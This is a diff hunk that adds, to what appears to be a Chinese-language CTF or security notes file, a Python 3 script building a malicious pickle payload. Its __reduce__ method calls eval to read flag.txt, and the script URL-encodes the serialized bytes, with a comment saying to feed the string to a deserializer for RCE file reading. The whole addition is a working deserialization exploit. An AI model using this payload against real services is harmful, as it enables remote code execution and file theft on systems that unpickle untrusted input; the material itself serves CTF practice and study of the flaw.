@@ -115,6 +115,24 @@ print(a)
 # 将生成的序列化串，传入反序列化进行RCE文件读取。
 ```
 
+```
+# Python 3的代码
+import pickle
+import urllib.parse
+
+class payload:
+    def __reduce__(self):
+        return (eval, ("open('flag.txt', 'r').read()",))
+
+# Python 3中pickle.dumps()返回的是bytes类型，不需要urllib.quote进行编码
+a = pickle.dumps(payload())
+
+# Python 3中urllib.quote函数在urllib.parse模块中
+a_quoted = urllib.parse.quote(a)  # 这里对bytes类型进行编码可能不是必要的
+print(a_quoted)
+# 将生成的序列化串，传入反序列化进行RCE文件读取。
+```
+
 
 
 
